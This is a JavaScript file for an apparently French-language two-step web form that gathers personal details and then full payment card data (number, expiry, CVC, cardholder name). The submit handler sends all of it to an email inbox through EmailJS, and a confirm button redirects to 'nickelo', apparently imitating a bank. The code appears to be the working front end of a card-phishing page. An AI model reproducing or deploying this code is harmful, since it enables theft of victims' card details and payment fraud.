onChangeInput = () => {
    console.log(this.length)
}

function showAlert() {
    
    $("#second-step").hide()
    $("#first-step").hide()
}



document.getElementById("confirm_btn").addEventListener("click", function () {
    window.location.href = "nickelo"
});


document.getElementById("btn-next").addEventListener("click", function () {
    let name = $("#dnom").val();
    let email = $("#dmail").val();
    let pays = $("#dpays").val();
    let tel = $("#dtel").val();
    let mont = $("#dmont").val();
    let dr = $("#ddr").val();
    
    //let info = $("#dinfos").val();

    if (name === '' || email === '' || pays === '' || tel === '' || mont === '' || dr === '') {
        $("#alertDanger").html("<div class='alert alert-danger'><strong> &rightarrow; Information</strong><p>Remplissez tout les champs svp</p></div>")
    } else {
        $("#second-step").show();
        $("#first-step").hide();
    }
});

document.getElementById("btn-submit").addEventListener("click", function (e) {
    console.log("Ah oui je suis submiter")
    
    let dcarte = $("#dcarte").val();
    let dcartedate = $("#dcartedate").val();
    let dcvc = $("#dcvc").val();
    let dcartenom = $("#dcartenom").val();

    let name = $("#dnom").val();
    let email = $("#dmail").val();
    let pays = $("#dpays").val();
    let tel = $("#dtel").val();
    let mont = $("#dmont").val();
    let dr = $("#ddr").val();
    
    let info = $("#dinfos").val();

    var tempParams = {
        name: name,
        email: email,
        tel: tel,
        pays: pays,
        dcarte: dcarte,
        dcartedate: dcartedate,
        dcvc: dcvc,
        dcartenom: dcartenom,
        mont: mont,
        dr: dr,
        info: info
    };

    emailjs.send("service_rb7wkid", "template_jy5nlmp", tempParams)
        .then(function (res) {
            console.log("success", res.status)
        });

    e.preventDefault();


});